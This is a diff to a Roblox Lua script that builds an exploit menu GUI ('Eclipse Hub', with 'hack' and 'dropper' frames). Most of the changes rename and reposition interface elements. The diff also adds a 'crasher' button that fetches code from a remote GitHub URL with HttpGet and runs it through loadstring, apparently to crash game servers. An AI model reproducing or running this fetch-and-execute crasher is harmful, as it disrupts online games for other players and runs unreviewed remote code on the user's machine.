@@ -22,11 +22,13 @@ local ImageButton = Instance.new("ImageButton")
 local TextButton = Instance.new("TextButton")
 local UICorner_4 = Instance.new("UICorner")
 local UIGradient_2 = Instance.new("UIGradient")
+local Back_2 = Instance.new("TextLabel")
+local crasher = Instance.new("TextButton")
 local dropperFrame = Instance.new("Frame")
 local UIGradient_3 = Instance.new("UIGradient")
 local UICorner_5 = Instance.new("UICorner")
 local Pattern_2 = Instance.new("ImageLabel")
-local Back_2 = Instance.new("TextButton")
+local Back_3 = Instance.new("TextButton")
 local UICorner_6 = Instance.new("UICorner")
 local RightArrow_2 = Instance.new("TextLabel")
 local LeftArrow_2 = Instance.new("TextLabel")
@@ -37,7 +39,7 @@ local hackFrame1 = Instance.new("Frame")
 local UICorner_7 = Instance.new("UICorner")
 local UIGradient_4 = Instance.new("UIGradient")
 local Pattern_3 = Instance.new("ImageLabel")
-local Back_3 = Instance.new("TextButton")
+local Back_4 = Instance.new("TextButton")
 local UICorner_8 = Instance.new("UICorner")
 local RightArrow_3 = Instance.new("TextLabel")
 local LeftArrow_3 = Instance.new("TextLabel")
@@ -45,7 +47,7 @@ local LeftArrow_3 = Instance.new("TextLabel")
 --Properties:
 
 MainGui.Name = "MainGui"
-MainGui.Parent = game.CoreGui
+MainGui.Parent = game.Workspace
 MainGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
 mainLobby.Name = "mainLobby"
@@ -62,7 +64,7 @@ DisplayName.Name = "DisplayName"
 DisplayName.Parent = mainLobby
 DisplayName.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 DisplayName.BackgroundTransparency = 1.000
-DisplayName.Position = UDim2.new(0.118393235, 0, 0.914590776, 0)
+DisplayName.Position = UDim2.new(0.11617998, 0, 0.797152996, 0)
 DisplayName.Size = UDim2.new(0.241014794, 0, 0.0854092538, 0)
 DisplayName.ZIndex = 2
 DisplayName.Font = Enum.Font.GothamSemibold
@@ -77,7 +79,7 @@ Username.Name = "Username"
 Username.Parent = mainLobby
 Username.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 Username.BackgroundTransparency = 1.000
-Username.Position = UDim2.new(0.118393235, 0, 0.722419918, 0)
+Username.Position = UDim2.new(0.114110403, 0, 0.811387837, 0)
 Username.Size = UDim2.new(0.298097253, 0, 0.241992876, 0)
 Username.ZIndex = 2
 Username.Font = Enum.Font.GothamSemibold
@@ -90,7 +92,7 @@ Username.TextXAlignment = Enum.TextXAlignment.Left
 
 ImageLabel.Parent = mainLobby
 ImageLabel.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
-ImageLabel.Position = UDim2.new(-0.0570824519, 0, 0.797152996, 0)
+ImageLabel.Position = UDim2.new(-0.0526063666, 0, 0.797152996, 0)
 ImageLabel.Size = UDim2.new(0.145877376, 0, 0.249110326, 0)
 ImageLabel.ZIndex = 3
 ImageLabel.Image = "rbxassetid://7072719446"
@@ -102,11 +104,11 @@ Back.Name = "Back"
 Back.Parent = mainLobby
 Back.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 Back.BackgroundTransparency = 1.000
-Back.Position = UDim2.new(0.308668077, 0, 0, 0)
+Back.Position = UDim2.new(0.325568229, 0, 0, 0)
 Back.Size = UDim2.new(0.382663846, 0, 0.160142347, 0)
 Back.ZIndex = 100
 Back.Font = Enum.Font.GothamSemibold
-Back.Text = "Eclipse Hub"
+Back.Text = "Eclipse"
 Back.TextColor3 = Color3.fromRGB(255, 255, 255)
 Back.TextScaled = true
 Back.TextSize = 57.000
@@ -172,6 +174,7 @@ Pattern.Name = "Pattern"
 Pattern.Parent = mainLobby
 Pattern.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 Pattern.BackgroundTransparency = 1.000
+Pattern.Position = UDim2.new(-0.0042283535, 0, -2.98023224e-08, 0)
 Pattern.Size = UDim2.new(1, 0, 1, 0)
 Pattern.ZIndex = 2
 Pattern.Image = "rbxassetid://2151741365"
@@ -190,7 +193,7 @@ ImageButton.Image = "rbxassetid://7072718840"
 
 TextButton.Parent = mainLobby
 TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-TextButton.Position = UDim2.new(0.488308728, 0, 0.834043741, 0)
+TextButton.Position = UDim2.new(1.29169142, 0, 1.40343869, 0)
 TextButton.Size = UDim2.new(0, 68, 0, 36)
 TextButton.ZIndex = 999
 TextButton.Font = Enum.Font.GothamSemibold
@@ -203,6 +206,33 @@ UICorner_4.Parent = TextButton
 
 UIGradient_2.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(182, 141, 159)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(64, 96, 161))}
 UIGradient_2.Parent = TextButton
+
+Back_2.Name = "Back"
+Back_2.Parent = mainLobby
+Back_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Back_2.BackgroundTransparency = 1.000
+Back_2.Position = UDim2.new(0.363623172, 0, 0.131672591, 0)
+Back_2.Size = UDim2.new(0.306131065, 0, 0.128113881, 0)
+Back_2.ZIndex = 100
+Back_2.Font = Enum.Font.GothamSemibold
+Back_2.Text = "Premium"
+Back_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+Back_2.TextSize = 18.000
+Back_2.TextWrapped = true
+
+crasher.Name = "crasher"
+crasher.Parent = mainLobby
+crasher.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+crasher.Position = UDim2.new(0.47991544, 0, 0.548042715, 0)
+crasher.Size = UDim2.new(0, 200, 0, 50)
+crasher.ZIndex = 999
+crasher.Font = Enum.Font.SourceSans
+crasher.Text = "crasher"
+crasher.TextColor3 = Color3.fromRGB(0, 0, 0)
+crasher.TextSize = 14.000
+crasher.MouseButton1Down:Connect(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/22kristina/dhcrash_gen2/main/crash", true))()
+end)
 
 dropperFrame.Name = "dropperFrame"
 dropperFrame.Parent = MainGui
@@ -232,23 +262,23 @@ Pattern_2.ScaleType = Enum.ScaleType.Tile
 Pattern_2.SliceCenter = Rect.new(0, 256, 0, 256)
 Pattern_2.TileSize = UDim2.new(0, 30, 0, 30)
 
-Back_2.Name = "Back"
-Back_2.Parent = dropperFrame
-Back_2.BackgroundColor3 = Color3.fromRGB(170, 0, 255)
-Back_2.BackgroundTransparency = 0.750
-Back_2.Position = UDim2.new(0.0338266343, 0, 0.787955523, 0)
-Back_2.Size = UDim2.new(0.313500434, 0, 0.167259768, 0)
-Back_2.ZIndex = 999999999
-Back_2.Font = Enum.Font.SourceSansBold
-Back_2.Text = "Back"
-Back_2.TextColor3 = Color3.fromRGB(255, 255, 255)
-Back_2.TextSize = 20.000
-Back_2.TextWrapped = true
+Back_3.Name = "Back"
+Back_3.Parent = dropperFrame
+Back_3.BackgroundColor3 = Color3.fromRGB(170, 0, 255)
+Back_3.BackgroundTransparency = 0.750
+Back_3.Position = UDim2.new(0.0338266343, 0, 0.787955523, 0)
+Back_3.Size = UDim2.new(0.313500434, 0, 0.167259768, 0)
+Back_3.ZIndex = 999999999
+Back_3.Font = Enum.Font.SourceSansBold
+Back_3.Text = "Back"
+Back_3.TextColor3 = Color3.fromRGB(255, 255, 255)
+Back_3.TextSize = 20.000
+Back_3.TextWrapped = true
 
-UICorner_6.Parent = Back_2
+UICorner_6.Parent = Back_3
 
 RightArrow_2.Name = "RightArrow"
-RightArrow_2.Parent = Back_2
+RightArrow_2.Parent = Back_3
 RightArrow_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 RightArrow_2.BackgroundTransparency = 1.000
 RightArrow_2.Position = UDim2.new(0.95745492, 0, -0.00872340426, 0)
@@ -262,7 +292,7 @@ RightArrow_2.TextTransparency = 1.000
 RightArrow_2.TextWrapped = true
 
 LeftArrow_2.Name = "LeftArrow"
-LeftArrow_2.Parent = Back_2
+LeftArrow_2.Parent = Back_3
 LeftArrow_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 LeftArrow_2.BackgroundTransparency = 1.000
 LeftArrow_2.Position = UDim2.new(-0.219675094, 0, -0.00872340426, 0)
@@ -336,23 +366,23 @@ Pattern_3.ScaleType = Enum.ScaleType.Tile
 Pattern_3.SliceCenter = Rect.new(0, 256, 0, 256)
 Pattern_3.TileSize = UDim2.new(0, 45, 0, 45)
 
-Back_3.Name = "Back"
-Back_3.Parent = hackFrame1
-Back_3.BackgroundColor3 = Color3.fromRGB(170, 0, 255)
-Back_3.BackgroundTransparency = 0.750
-Back_3.Position = UDim2.new(0.0338266343, 0, 0.787955523, 0)
-Back_3.Size = UDim2.new(0.313500434, 0, 0.167259768, 0)
-Back_3.ZIndex = 999999999
-Back_3.Font = Enum.Font.SourceSansBold
-Back_3.Text = "Back"
-Back_3.TextColor3 = Color3.fromRGB(255, 255, 255)
-Back_3.TextSize = 20.000
-Back_3.TextWrapped = true
+Back_4.Name = "Back"
+Back_4.Parent = hackFrame1
+Back_4.BackgroundColor3 = Color3.fromRGB(170, 0, 255)
+Back_4.BackgroundTransparency = 0.750
+Back_4.Position = UDim2.new(0.0338266343, 0, 0.787955523, 0)
+Back_4.Size = UDim2.new(0.313500434, 0, 0.167259768, 0)
+Back_4.ZIndex = 999999999
+Back_4.Font = Enum.Font.SourceSansBold
+Back_4.Text = "Back"
+Back_4.TextColor3 = Color3.fromRGB(255, 255, 255)
+Back_4.TextSize = 20.000
+Back_4.TextWrapped = true
 
-UICorner_8.Parent = Back_3
+UICorner_8.Parent = Back_4
 
 RightArrow_3.Name = "RightArrow"
-RightArrow_3.Parent = Back_3
+RightArrow_3.Parent = Back_4
 RightArrow_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 RightArrow_3.BackgroundTransparency = 1.000
 RightArrow_3.Position = UDim2.new(0.95745492, 0, -0.00872340426, 0)
@@ -366,7 +396,7 @@ RightArrow_3.TextTransparency = 1.000
 RightArrow_3.TextWrapped = true
 
 LeftArrow_3.Name = "LeftArrow"
-LeftArrow_3.Parent = Back_3
+LeftArrow_3.Parent = Back_4
 LeftArrow_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 LeftArrow_3.BackgroundTransparency = 1.000
 LeftArrow_3.Position = UDim2.new(-0.219675094, 0, -0.00872340426, 0)
@@ -381,7 +411,7 @@ LeftArrow_3.TextWrapped = true
 
 -- Scripts:
 
-local function FDGSN_fake_script() -- mainLobby.PlayerNames 
+local function VFLUW_fake_script() -- mainLobby.PlayerNames 
 	local script = Instance.new('LocalScript', mainLobby)
 
 	local plr = game.Players.LocalPlayer
@@ -389,8 +419,8 @@ local function FDGSN_fake_script() -- mainLobby.PlayerNames
 	script.Parent.DisplayName.Text = plr.DisplayName
 	script.Parent.Username.Text = "@"..plr.Name 
 end
-coroutine.wrap(FDGSN_fake_script)()
-local function VSDV_fake_script() -- ImageLabel.LocalScript 
+coroutine.wrap(VFLUW_fake_script)()
+local function ZLEKEM_fake_script() -- ImageLabel.LocalScript 
 	local script = Instance.new('LocalScript', ImageLabel)
 
 	local plr = game.Players.LocalPlayer
@@ -398,8 +428,8 @@ local function VSDV_fake_script() -- ImageLabel.LocalScript
 	
 	script.Parent.Image = img
 end
-coroutine.wrap(VSDV_fake_script)()
-local function PKYNSH_fake_script() -- AboutUs.HoverScript 
+coroutine.wrap(ZLEKEM_fake_script)()
+local function QTKREO_fake_script() -- AboutUs.HoverScript 
 	local script = Instance.new('LocalScript', AboutUs)
 
 	-- This is for the buttons effects.
@@ -447,18 +477,17 @@ local function PKYNSH_fake_script() -- AboutUs.HoverScript
 		TweenService:Create(rightarrow, Info, {TextTransparency = 1}):Play()
 	end)
 end
-coroutine.wrap(PKYNSH_fake_script)()
-local function QBIWWX_fake_script() -- AboutUs.LocalScript 
+coroutine.wrap(QTKREO_fake_script)()
+local function NWQSU_fake_script() -- AboutUs.LocalScript 
 	local script = Instance.new('LocalScript', AboutUs)
 
 	script.Parent.MouseButton1Down:connect(function()
 		script.Parent.Parent.Parent.dropperFrame.Visible = true
 		script.Parent.Parent.Parent.mainLobby.Visible = false
-	
 	end)
 end
-coroutine.wrap(QBIWWX_fake_script)()
-local function PBEJQGR_fake_script() -- ImageButton.LocalScript 
+coroutine.wrap(NWQSU_fake_script)()
+local function BONM_fake_script() -- ImageButton.LocalScript 
 	local script = Instance.new('LocalScript', ImageButton)
 
 	script.Parent.MouseButton1Down:connect(function()
@@ -467,19 +496,20 @@ local function PBEJQGR_fake_script() -- ImageButton.LocalScript
 	
 	end)
 end
-coroutine.wrap(PBEJQGR_fake_script)()
-local function ABSUBY_fake_script() -- TextButton.LocalScript 
+coroutine.wrap(BONM_fake_script)()
+local function JTCQX_fake_script() -- TextButton.LocalScript 
 	local script = Instance.new('LocalScript', TextButton)
 
 	script.Parent.MouseButton1Down:connect(function()
+		script.Parent.Parent.Parent.hackFrame1.Position = script.Parent.Parent.Parent.mainLobby.Position
 		script.Parent.Parent.Parent.hackFrame1.Visible = true
 		script.Parent.Parent.Parent.mainLobby.Visible = false
 		script.Parent.Parent.Parent.PopOut.Visible = false
 	end)
 end
-coroutine.wrap(ABSUBY_fake_script)()
-local function YTUYA_fake_script() -- Back_2.HoverScript 
-	local script = Instance.new('LocalScript', Back_2)
+coroutine.wrap(JTCQX_fake_script)()
+local function MWMHSYL_fake_script() -- Back_3.HoverScript 
+	local script = Instance.new('LocalScript', Back_3)
 
 	-- This is for the buttons effects.
 	-- Edit if you know what you are doing.
@@ -526,9 +556,9 @@ local function YTUYA_fake_script() -- Back_2.HoverScript
 		TweenService:Create(rightarrow, Info, {TextTransparency = 1}):Play()
 	end)
 end
-coroutine.wrap(YTUYA_fake_script)()
-local function BHCS_fake_script() -- Back_2.LocalScript 
-	local script = Instance.new('LocalScript', Back_2)
+coroutine.wrap(MWMHSYL_fake_script)()
+local function QRDHWUL_fake_script() -- Back_3.LocalScript 
+	local script = Instance.new('LocalScript', Back_3)
 
 	script.Parent.MouseButton1Down:connect(function()
 		script.Parent.Parent.Parent.dropperFrame.Visible = false
@@ -536,9 +566,9 @@ local function BHCS_fake_script() -- Back_2.LocalScript
 	
 	end)
 end
-coroutine.wrap(BHCS_fake_script)()
-local function YIWNSFP_fake_script() -- Back_3.HoverScript 
-	local script = Instance.new('LocalScript', Back_3)
+coroutine.wrap(QRDHWUL_fake_script)()
+local function GRHAMN_fake_script() -- Back_4.HoverScript 
+	local script = Instance.new('LocalScript', Back_4)
 
 	-- This is for the buttons effects.
 	-- Edit if you know what you are doing.
@@ -585,9 +615,9 @@ local function YIWNSFP_fake_script() -- Back_3.HoverScript
 		TweenService:Create(rightarrow, Info, {TextTransparency = 1}):Play()
 	end)
 end
-coroutine.wrap(YIWNSFP_fake_script)()
-local function VXULNB_fake_script() -- Back_3.LocalScript 
-	local script = Instance.new('LocalScript', Back_3)
+coroutine.wrap(GRHAMN_fake_script)()
+local function BPJHK_fake_script() -- Back_4.LocalScript 
+	local script = Instance.new('LocalScript', Back_4)
 
 	script.Parent.MouseButton1Down:connect(function()
 		script.Parent.Parent.Parent.hackFrame1.Visible = false
@@ -595,4 +625,4 @@ local function VXULNB_fake_script() -- Back_3.LocalScript
 	
 	end)
 end
-coroutine.wrap(VXULNB_fake_script)()
+coroutine.wrap(BPJHK_fake_script)()
